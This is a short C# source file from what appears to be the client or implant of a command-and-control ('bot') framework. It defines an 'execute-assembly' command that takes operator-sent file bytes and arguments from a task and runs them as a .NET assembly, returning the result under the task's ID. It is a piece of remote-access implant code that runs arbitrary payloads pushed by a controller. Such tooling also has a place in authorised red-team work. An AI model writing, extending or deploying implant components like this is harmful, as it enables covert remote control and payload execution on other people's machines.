using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using pattaya_project_client.Services;

namespace pattaya_project_client.Commands.Implements
{
    public class ExecuteAssembly : BotCommand
    {
        public override string TaskName => "execute-assembly";

        public override BotTaskResult RunTask(BotTask task)
        {

            var arguments = task.Arguments.Split(' ');
            if (arguments is null || arguments.Length == 0 || arguments[0] == "")
            {
                arguments = null;
            }


            return new BotTaskResult
            {
                TaskId = task.TaskId,
                Result = Execute.ExecuteAssembly(task.FileBytes, arguments)
            };

            
        }
    }
}
